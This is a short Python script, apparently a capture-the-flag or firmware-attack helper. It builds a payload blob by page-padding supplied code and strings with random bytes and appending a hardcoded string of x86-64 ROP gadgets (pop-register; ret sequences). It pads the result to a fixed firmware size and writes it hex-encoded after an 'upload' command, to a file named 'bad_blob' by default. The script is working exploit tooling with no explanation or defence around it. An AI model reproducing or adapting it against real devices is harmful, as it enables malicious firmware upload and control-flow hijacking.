import sys
import random
import binascii

def page_align(n):
    return int((n + 0xfff) / 0x1000) * 0x1000

def random_pad(n):
    return b''.join([random.randint(0, 255).to_bytes(1, 'big') for _ in range(n)])

FIRMWARE_SIZE = 0x2000
gadgets = b"\x5f\xc3\x5e\xc3\x5a\xc3\x5c\xc3"

def main(argc, argv):
    strings = None
    outfile = 'bad_blob'
    if (argc > 2):
        strings = open(argv[2], "rb").read()
    if (argc > 3):
        outfile = argv[3]

    blob = open(argv[1], "rb").read()

    if not strings is None:
        # pad to page size with random data
        print(len(blob))
        aligned_len = page_align(len(blob))
        print("Text blob padded len: %d" % aligned_len)

        blob += random_pad(aligned_len - len(blob))

        string_aligned_len = page_align(len(strings))
        print("String aligned len: %d" % string_aligned_len)
        blob += strings + random_pad(string_aligned_len - len(strings))


    if len(blob) != FIRMWARE_SIZE and len(blob) > FIRMWARE_SIZE - len(gadgets):
        print("NOT ENOUGH SLACK SPACE IN BLOB!")
        print("Had %d Needed %d" % (len(blob), FIRMWARE_SIZE - len(gadgets)))
        response = input("Continue anyways [y/N]>")
        if response != "y":
            sys.exit(1)

    blob += gadgets
    blob = blob.ljust(FIRMWARE_SIZE, b"\x00")
    encoded = binascii.hexlify(blob)
    print(encoded)

    if not outfile is None:
        with open("%s.raw" % outfile, "wb") as f:
            f.write(blob)

        with open(outfile, "wb") as f:
            f.write(b"upload\n")
            f.write(encoded)
            f.write(b"\n")

    print("Length: {}".format(len(blob)))

if __name__ == '__main__':
    main(len(sys.argv), sys.argv)
